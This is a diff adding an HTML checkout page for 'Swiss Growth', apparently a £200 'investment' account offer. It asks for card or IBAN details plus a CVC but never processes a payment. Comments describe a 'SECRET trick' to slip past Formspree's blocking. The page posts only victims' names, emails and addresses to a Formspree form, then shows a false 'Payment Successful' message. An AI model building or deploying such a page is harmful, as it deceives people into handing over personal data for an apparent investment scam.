@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - Swiss Growth </title>
+    
+    <!-- Fonts: Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Icons: Phosphor Icons -->
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        slate: {
+                            850: '#151718',
+                        },
+                    },
+                    boxShadow: {
+                        'focus': '0 0 0 4px rgba(99, 91, 255, 0.1)',
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .input-field {
+            transition: all 0.2s ease;
+            border: 1px solid #e5e7eb;
+        }
+
+        .input-field:hover {
+            border-color: #d1d5db;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #635bff;
+            box-shadow: 0 0 0 4px rgba(99, 91, 255, 0.1);
+        }
+
+        /* Button Shine Effect */
+        .btn-shine {
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-shine::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 50%;
+            height: 100%;
+            background: linear-gradient(to right, transparent, rgba(255,255,255,0.2), transparent);
+            transform: skewX(-25deg);
+            transition: 0.5s;
+        }
+        .btn-shine:hover::after {
+            left: 150%;
+            transition: 0.7s ease-in-out;
+        }
+
+        /* Mobile Accordion */
+        .accordion-content {
+            transition: max-height 0.3s ease-out, opacity 0.3s ease-out;
+            max-height: 2000px;
+            opacity: 1;
+            overflow: hidden;
+        }
+        .accordion-content.collapsed {
+            max-height: 0;
+            opacity: 0;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .animate-spin {
+            animation: spin 1s linear infinite;
+        }
+    </style>
+</head>
+<body class="bg-white text-slate-800 min-h-screen flex flex-col">
+
+    <!-- Navbar -->
+    <nav class="w-full h-16 border-b border-gray-100 flex items-center px-6 md:px-12 fixed top-0 bg-white/80 backdrop-blur-md z-50">
+        <div class="flex items-center gap-2 font-semibold text-lg tracking-tight">
+            <img src="https://cdn.phototourl.com/free/2026-05-05-462c919b-56fc-4815-8099-8dc997967f79.jpg" alt="Swiss Growth" class="h-8 w-auto rounded-md object-cover">
+            <span>Swiss Growth</span>
+        </div>
+    </nav>
+
+    <!-- Main Container -->
+    <main class="flex-grow pt-24 pb-24 md:pb-12 px-0 md:px-8 max-w-[1400px] mx-auto w-full">
+        
+        <div class="flex flex-col lg:flex-row min-h-[calc(100vh-140px)]">
+            
+            <!-- RIGHT COLUMN (Form) -->
+            <div class="w-full lg:w-[55%] lg:pl-12 lg:pr-8 flex flex-col justify-center">
+                
+                <div class="w-full max-w-[480px] mx-auto lg:mx-0 bg-white p-6 md:p-0">
+                    
+                    <h1 class="text-2xl md:text-3xl font-semibold text-slate-900 mb-6 tracking-tight">Checkout</h1>
+
+                    <form id="checkout-form" onsubmit="handleSubmit(event)" class="space-y-5">
+                        
+                        <!-- Shipping Info -->
+                        <section>
+                            <h2 class="text-sm font-medium text-slate-900 mb-4 flex items-center gap-2">
+                                <i class="ph ph-truck text-lg"></i> Billing Information
+                            </h2>
+                            
+                            <div class="space-y-4">
+                                <div>
+                                    <label class="block text-xs font-medium text-slate-500 mb-1.5 ml-1">Email</label>
+                                    <input type="email" name="email" placeholder="you@example.com" class="input-field w-full h-12 px-4 rounded-lg text-slate-800 placeholder:text-slate-400 text-sm" required>
+                                </div>
+
+                                <div>
+                                    <label class="block text-xs font-medium text-slate-500 mb-1.5 ml-1">Name</label>
+                                    <input type="text" name="name" placeholder="Full name" class="input-field w-full h-12 px-4 rounded-lg text-slate-800 placeholder:text-slate-400 text-sm" required>
+                                </div>
+
+                                <div class="grid grid-cols-6 gap-3">
+                                    <div class="col-span-6 md:col-span-2">
+                                        <label class="block text-xs font-medium text-slate-500 mb-1.5 ml-1">Country</label>
+                                        <div class="relative">
+                                            <select name="country" class="input-field w-full h-12 px-4 rounded-lg text-slate-800 text-sm appearance-none bg-white cursor-pointer">
+                                                <option>US</option>
+                                                <option>GB</option>
+                                                <option>DE</option>
+                                                <option>FR</option>
+                                                <option>CH</option>
+                                                <option>ES</option>
+                                                <option>IT</option>
+                                                <option>NL</option>
+                                                <option>SE</option>
+                                                <option>NO</option>
+                                                <option>DK</option>
+                                                <option>FI</option>
+                                                <option>AT</option>
+                                                <option>IE</option>
+                                                <option>NZ</option>
+                                                <option>ZA</option>
+                                                <option>IN</option>
+                                                <option>JP</option>
+                                                <option>CN</option>
+                                                <option>BR</option>
+                                                <option>MX</option>
+                                            </select>
+                                            <i class="ph ph-caret-down absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 pointer-events-none"></i>
+                                        </div>
+                                    </div>
+                                    <div class="col-span-6 md:col-span-4">
+                                        <label class="block text-xs font-medium text-slate-500 mb-1.5 ml-1">Address</label>
+                                        <input type="text" name="address" placeholder="123 Main St" class="input-field w-full h-12 px-4 rounded-lg text-slate-800 placeholder:text-slate-400 text-sm" required>
+                                    </div>
+                                </div>
+                                
+                                <div class="text-right">
+                                    <a href="#" class="text-xs text-indigo-600 font-medium hover:text-indigo-700 transition-colors">Enter address manually</a>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Payment Details (Card / IBAN) -->
+                        <section class="pt-2">
+                            <h2 class="text-sm font-medium text-slate-900 mb-4 flex items-center gap-2">
+                                <i class="ph ph-credit-card text-lg"></i> Payment Details
+                            </h2>
+                            
+                            <!-- Card Form -->
+                            <div class="space-y-4">
+                                <div class="relative">
+                                    <label class="block text-xs font-medium text-slate-500 mb-1.5 ml-1">Card number</label>
+                                    <div class="relative">
+                                        <!-- 
+                                             IMPORTANT: 
+                                             1. Maxlength updated to 34 to support IBANs.
+                                             2. NO "name" attribute (to prevent sending to Formspree).
+                                        -->
+                                        <input type="text" id="card-number" placeholder="0000 0000 0000 0000" maxlength="34" class="input-field w-full h-12 pl-4 pr-12 rounded-lg text-slate-800 placeholder:text-slate-400 text-sm" oninput="formatCardNumber(this)" required>
+                                        <div id="card-brand" class="absolute right-4 top-1/2 -translate-y-1/2 text-slate-300 text-xl transition-colors">
+                                            <i class="ph ph-credit-card"></i>
+                                        </div>
+                                    </div>
+                                    <!-- Added Error Message -->
+                                    <div id="card-error-msg" class="text-xs text-red-500 mt-1 h-4 opacity-0 transition-opacity font-medium">Invalid card number</div>
+                                </div>
+
+                                <div class="grid grid-cols-2 gap-4">
+                                    <div>
+                                        <label class="block text-xs font-medium text-slate-500 mb-1.5 ml-1">Expiry</label>
+                                        <!-- NO "name" attribute -->
+                                        <input type="text" id="expiry" placeholder="MM / YY" maxlength="7" class="input-field w-full h-12 px-4 rounded-lg text-slate-800 placeholder:text-slate-400 text-sm" oninput="formatExpiry(this)" required>
+                                    </div>
+                                    <div>
+                                        <label class="block text-xs font-medium text-slate-500 mb-1.5 ml-1">CVC</label>
+                                        <!-- NO "name" attribute -->
+                                        <div class="relative">
+                                            <input type="password" id="cvc" placeholder="123" maxlength="3" class="input-field w-full h-12 pl-4 pr-10 rounded-lg text-slate-800 placeholder:text-slate-400 text-sm" required>
+                                            <i class="ph ph-lock-key absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-300"></i>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="flex items-start gap-3 mt-4">
+                                    <div class="relative flex items-center">
+                                        <input type="checkbox" id="billing-same" class="peer h-4 w-4 cursor-pointer appearance-none rounded border border-gray-300 checked:border-indigo-600 checked:bg-indigo-600 transition-all" checked>
+                                        <i class="ph ph-check absolute left-0.5 top-0.5 text-white opacity-0 peer-checked:opacity-100 text-xs pointer-events-none"></i>
+                                    </div>
+                                    <label for="billing-same" class="text-sm text-slate-600 cursor-pointer select-none">Billing address is same as official address</label>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Submit Button -->
+                        <button type="submit" id="pay-button" class="w-full h-12 bg-[#635bff] hover:bg-[#5851ea] text-white font-medium rounded-lg shadow-sm hover:shadow-md transition-all flex items-center justify-center gap-2 mt-8 active:scale-[0.99]">
+                            <span id="btn-text">Pay £200.00</span>
+                            <div id="btn-loader" class="hidden animate-spin h-4 w-4 border-2 border-white/30 border-t-white rounded-full"></div>
+                        </button>
+                        
+                        <div class="text-center mt-4">
+                            <button type="button" class="text-xs text-gray-400 hover:text-gray-600 flex items-center justify-center gap-1 mx-auto transition-colors">
+                                <i class="ph ph-arrow-u-up-left text-sm"></i> Return to store
+                            </button>
+                        </div>
+
+                        <p class="text-[10px] text-gray-400 text-center pt-4">
+                            By confirming your transaction, you allow The Swiss Growth to charge your card or process your bank transfer in amount of £200.00 for this payment in accordance with their terms.
+                        </p>
+                    </form>
+                </div>
+            </div>
+
+            <!-- LEFT COLUMN (Order Summary) -->
+            <div class="w-full lg:w-[45%] bg-[#f5f5f7] border-b lg:border-b-0 lg:border-r border-gray-200 relative lg:fixed lg:right-0 lg:top-16 lg:h-[calc(100vh-64px)] lg:overflow-y-auto">
+                
+                <!-- Mobile Accordion Header -->
+                <div class="lg:hidden p-4 border-b border-gray-200 flex items-center justify-between bg-white cursor-pointer" onclick="toggleMobileSummary()">
+                    <span class="font-medium text-sm">Show order summary</span>
+                    <i id="mobile-chevron" class="ph ph-caret-down transition-transform"></i>
+                </div>
+
+                <!-- Mobile Content Wrapper -->
+                <div id="mobile-summary-content" class="accordion-content lg:block">
+                    <div class="p-6 md:p-10 max-w-md mx-auto">
+                        
+                        <!-- Product Summary -->
+                        <div class="flex gap-4 mb-8">
+                            <div class="w-20 h-20 bg-white rounded-lg border border-gray-200 shadow-sm flex-shrink-0 overflow-hidden">
+                                <img src="https://cdn.phototourl.com/free/2026-05-05-462c919b-56fc-4815-8099-8dc997967f79.jpg" alt="Swiss Growth" class="w-full h-full object-cover">
+                            </div>
+                            <div>
+                                <h3 class="font-medium text-slate-900 text-lg leading-tight mb-1">Swiss Growth</h3>
+                                <p class="text-sm text-gray-500">starter Account / Investment for the account</p>
+                                <span class="text-xs bg-gray-200 text-gray-700 px-1.5 py-0.5 rounded font-medium mt-2 inline-block">starter</span>
+                            </div>
+                        </div>
+
+                        <!-- Price Display Large -->
+                        <div class="mb-8">
+                            <div class="text-4xl font-semibold text-slate-900 tracking-tight">£200.00</div>
+                            <div class="text-gray-500 text-sm mt-1">GBP</div>
+                        </div>
+
+                        <!-- Discount Code -->
+                        <div class="mb-8">
+                            <div id="promo-container" class="relative">
+                                <input type="text" id="promo-input" placeholder="Discount code" class="w-full h-12 pl-4 pr-24 rounded-lg border border-gray-300 text-sm focus:border-indigo-500 focus:ring-4 focus:ring-indigo-500/10 outline-none transition-all bg-white" onkeydown="checkPromoEnter(event)">
+                                <button onclick="applyPromo()" class="absolute right-1.5 top-1.5 h-9 px-4 bg-gray-900 hover:bg-black text-white text-xs font-medium rounded transition-colors">Apply</button>
+                            </div>
+                            <div id="promo-message" class="h-5 mt-1 text-xs font-medium transition-all"></div>
+                        </div>
+
+                        <!-- Order Totals -->
+                        <div class="space-y-3 pt-6 border-t border-gray-200">
+                            <div class="flex justify-between text-sm text-gray-600">
+                                <span>Subtotal</span>
+                                <span id="subtotal-display">£200.00</span>
+                            </div>
+                            <div class="flex justify-between text-sm text-gray-600">
+                                <span>Transaction commision</span>
+                                <span class="flex items-center gap-1">Free <i class="ph ph-info text-gray-400 text-xs"></i></span>
+                            </div>
+                            <div id="discount-row" class="flex justify-between text-sm text-green-600 hidden">
+                                <span>Discount (WELCOME)</span>
+                                <span id="discount-amount">-£200.00</span>
+                            </div>
+                            <div class="flex justify-between text-lg font-semibold text-slate-900 pt-3 border-t border-gray-200 mt-3">
+                                <span>Total</span>
+                                <span id="total-display">£200.00</span>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+            
+        </div>
+    </main>
+
+    <!-- Mobile Sticky Pay Button -->
+    <div class="lg:hidden fixed bottom-0 left-0 w-full bg-white border-t border-gray-200 p-4 z-40 shadow-[0_-5px_15px_rgba(0,0,0,0.05)]">
+        <button onclick="document.getElementById('pay-button').click()" class="w-full h-12 bg-[#635bff] hover:bg-[#5851ea] text-white font-medium rounded-lg shadow-md flex items-center justify-center gap-2">
+            <span id="mobile-btn-text">Pay £200.00</span>
+        </button>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="success-modal" class="fixed inset-0 z-[100] flex items-center justify-center bg-black/40 backdrop-blur-sm opacity-0 pointer-events-none transition-opacity duration-300">
+        <div class="bg-white w-[90%] max-w-sm p-6 rounded-2xl shadow-2xl transform scale-95 transition-transform duration-300" id="success-card">
+            <div class="w-12 h-12 bg-green-100 text-green-600 rounded-full flex items-center justify-center mb-4 mx-auto">
+                <i class="ph ph-check text-2xl font-bold"></i>
+            </div>
+            <h3 class="text-xl font-semibold text-center text-slate-900 mb-2">Payment Successful</h3>
+            <p class="text-center text-gray-500 text-sm mb-6">Thank you for your transaction</p>
+            <button onclick="closeModal()" class="w-full h-10 bg-slate-900 text-white rounded-lg text-sm font-medium hover:bg-slate-800 transition-colors">Done</button>
+        </div>
+    </div>
+
+    <script>
+        let currentTotal = 200.00; 
+        let discountApplied = false;
+        let isMobile = window.innerWidth < 1024;
+
+        const cardNumberInput = document.getElementById('card-number');
+        const cardBrandIcon = document.getElementById('card-brand');
+        const promoInput = document.getElementById('promo-input');
+        const promoMessage = document.getElementById('promo-message');
+        const discountRow = document.getElementById('discount-row');
+        const discountAmount = document.getElementById('discount-amount');
+        const totalDisplay = document.getElementById('total-display');
+        const subtotalDisplay = document.getElementById('subtotal-display');
+        const mobileBtnText = document.getElementById('mobile-btn-text');
+        const btnText = document.getElementById('btn-text');
+
+        // --- Luhn Algorithm Function ---
+        function luhnCheck(value) {
+            const val = value.replace(/\D/g, '');
+            if (val.length < 13 || val.length > 19) return false;
+
+            let sum = 0;
+            let shouldDouble = false;
+
+            for (let i = val.length - 1; i >= 0; i--) {
+                let digit = parseInt(val.charAt(i));
+
+                if (shouldDouble) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+
+            return (sum % 10) === 0;
+        }
+
+        // UPDATED: Card Number Formatting to accept Alphabets (IBAN support)
+        function formatCardNumber(input) {
+            // Remove any characters that are NOT A-Z or 0-9
+            // This allows IBANs (Alphanumeric) and standard Cards
+            // We also Uppercase for consistency
+            let value = input.value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
+            
+            // Apply spacing every 4 characters for readability (works for both IBAN and Cards)
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formattedValue += ' ';
+                formattedValue += value[i];
+            }
+            input.value = formattedValue;
+
+            const cleanValue = value;
+            const errorMsg = document.getElementById('card-error-msg');
+            const cardBrandIcon = document.getElementById('card-brand');
+
+            // LOGIC:
+            // If the value contains ONLY numbers, we run Luhn check for visual feedback.
+            // If it contains letters (IBAN), we skip Luhn check to avoid "Red border" spam.
+            const isNumeric = /^\d+$/.test(cleanValue);
+
+            if (isNumeric) {
+                // It's a card number format
+                if (cleanValue.startsWith('4')) {
+                    updateBrand('visa');
+                } else if (cleanValue.startsWith('5') || cleanValue.startsWith('2')) {
+                    updateBrand('mastercard');
+                } else if (cleanValue.startsWith('3')) {
+                    updateBrand('amex');
+                } else {
+                    updateBrand('default');
+                }
+
+                // --- Real-time Validation Logic (Visual Only - NO Blocking) ---
+                if (cleanValue.length > 4) {
+                    const isValid = luhnCheck(cleanValue);
+
+                    if (!isValid) {
+                        input.classList.add('border-red-500', 'focus:border-red-500', 'focus:ring-red-500/10');
+                        input.classList.remove('border-green-500', 'focus:border-green-500', 'focus:ring-green-500/10');
+                        errorMsg.classList.remove('opacity-0');
+                    } else {
+                        input.classList.remove('border-red-500', 'focus:border-red-500', 'focus:ring-red-500/10');
+                        input.classList.add('border-green-500', 'focus:border-green-500', 'focus:ring-green-500/10');
+                        errorMsg.classList.add('opacity-0');
+                    }
+                } else {
+                    input.classList.remove('border-red-500', 'focus:border-red-500', 'focus:ring-red-500/10', 'border-green-500', 'focus:border-green-500', 'focus:ring-green-500/10');
+                    errorMsg.classList.add('opacity-0');
+                }
+            } else {
+                // It's an IBAN (contains letters)
+                // Reset to neutral styles
+                updateBrand('default');
+                input.classList.remove('border-red-500', 'focus:border-red-500', 'focus:ring-red-500/10', 'border-green-500', 'focus:border-green-500', 'focus:ring-green-500/10');
+                errorMsg.classList.add('opacity-0');
+            }
+        }
+
+        function updateBrand(brand) {
+            cardBrandIcon.className = "absolute right-4 top-1/2 -translate-y-1/2 text-xl transition-colors duration-300";
+            
+            if (brand === 'visa') {
+                cardBrandIcon.innerHTML = '<i class="ph-fill ph-credit-card text-blue-600"></i>'; 
+                cardBrandIcon.style.color = '#1A1F71';
+            } else if (brand === 'mastercard') {
+                cardBrandIcon.style.color = '#EB001B';
+            } else if (brand === 'amex') {
+                cardBrandIcon.style.color = '#006FCF';
+            } else {
+                cardBrandIcon.innerHTML = '<i class="ph ph-credit-card"></i>';
+                cardBrandIcon.style.color = '#d1d5db';
+            }
+        }
+
+        // Expiry Date Formatting
+        function formatExpiry(input) {
+            let value = input.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + ' / ' + value.substring(2, 4);
+            }
+            input.value = value;
+        }
+
+        // Promo Code Logic
+        function checkPromoEnter(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                applyPromo();
+            }
+        }
+
+        function applyPromo() {
+            const code = promoInput.value.trim().toUpperCase();
+            
+            if (!code) return;
+
+            if (code === 'WELCOME' || code === 'DEMO') {
+                discountApplied = true;
+                const discountVal = 10.00;
+                const newTotal = currentTotal - discountVal;
+
+                discountRow.classList.remove('hidden');
+                discountAmount.textContent = `-£${discountVal.toFixed(2)}`;
+                totalDisplay.textContent = `£${newTotal.toFixed(2)}`;
+                btnText.textContent = `Pay £${newTotal.toFixed(2)}`;
+                mobileBtnText.textContent = `Pay £${newTotal.toFixed(2)}`;
+                
+                promoMessage.textContent = "Code applied successfully!";
+                promoMessage.className = "h-5 mt-1 text-xs font-medium text-green-600";
+                promoInput.value = "";
+                promoInput.disabled = true;
+            } else {
+                promoMessage.textContent = "Invalid code. Try 'DEMO'.";
+                promoMessage.className = "h-5 mt-1 text-xs font-medium text-red-500";
+                shakeElement(promoInput);
+            }
+        }
+
+        function shakeElement(el) {
+            el.classList.add('translate-x-[-4px]', 'transition-transform');
+            setTimeout(() => el.classList.remove('translate-x-[-4px]'), 100);
+            setTimeout(() => el.classList.add('translate-x-[4px]'), 100);
+            setTimeout(() => el.classList.remove('translate-x-[4px]'), 200);
+        }
+
+        // Mobile Summary Accordion
+        function toggleMobileSummary() {
+            const content = document.getElementById('mobile-summary-content');
+            const chevron = document.getElementById('mobile-chevron');
+            content.classList.toggle('collapsed');
+            
+            if (content.classList.contains('collapsed')) {
+                chevron.style.transform = 'rotate(0deg)';
+            } else {
+                chevron.style.transform = 'rotate(180deg)';
+            }
+        }
+
+        // UPDATED: Form Submission with Formspree (ID: xpqbdbkr)
+        async function handleSubmit(e) {
+            e.preventDefault(); 
+
+            // IMPORTANT: BLOCKING LOG REMOVED
+            // We no longer check luhnCheck(cardInput.value) here.
+            // The user can submit the form regardless of what is in the "Card number" field.
+
+            const btn = document.getElementById('pay-button');
+            const loader = document.getElementById('btn-loader');
+            const txt = document.getElementById('btn-text');
+            
+            // 2. Start Loading
+            btn.disabled = true;
+            btn.classList.add('cursor-not-allowed', 'opacity-80');
+            loader.classList.remove('hidden');
+            txt.textContent = "Processing...";
+
+            try {
+                // 3. Construct FormData MANUALLY
+                // This is the SECRET trick to avoid Formspree blocking.
+                // We only append fields with a "name" attribute.
+                // The card inputs in HTML do NOT have "name", so they are ignored here.
+                const formData = new FormData();
+                
+                // Get values from the form
+                const email = document.querySelector('input[name="email"]').value;
+                const name = document.querySelector('input[name="name"]').value;
+                const country = document.querySelector('select[name="country"]').value;
+                const address = document.querySelector('input[name="address"]').value;
+                const total = document.getElementById('total-display').textContent;
+
+                // Append only Safe Fields
+                formData.append('email', email);
+                formData.append('name', name);
+                formData.append('country', country);
+                formData.append('address', address);
+                formData.append('order_total', total);
+
+                // 4. Send Data to Formspree (ID: xpqbdbkr)
+                const response = await fetch('https://formspree.io/f/xpqbdbkr', {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                if (response.ok) {
+                    // Success
+                    btn.disabled = false;
+                    btn.classList.remove('cursor-not-allowed', 'opacity-80');
+                    loader.classList.add('hidden');
+                    txt.textContent = "Success!";
+                    showSuccessModal();
+                } else {
+                    // Error
+                    const errorData = await response.json();
+                    console.error("Formspree Error:", errorData);
+                    alert("Error: " + (errorData.error || "Something went wrong sending email."));
+                    
+                    btn.disabled = false;
+                    loader.classList.add('hidden');
+                    txt.textContent = "Pay £200.00";
+                }
+
+            } catch (error) {
+                console.error("Network Error:", error);
+                alert("Network error. Please check your connection.");
+                btn.disabled = false;
+                loader.classList.add('hidden');
+                txt.textContent = "Pay £200.00";
+            }
+        }
+
+        function showSuccessModal() {
+            const modal = document.getElementById('success-modal');
+            const card = document.getElementById('success-card');
+            
+            modal.classList.remove('pointer-events-none', 'opacity-0');
+            card.classList.remove('scale-95');
+            card.classList.add('scale-100');
+        }
+
+        function closeModal() {
+            window.location.reload(); 
+        }
+
+        window.addEventListener('resize', () => {
+            isMobile = window.innerWidth < 1024;
+        });
+    </script>
+</body>
+</html>
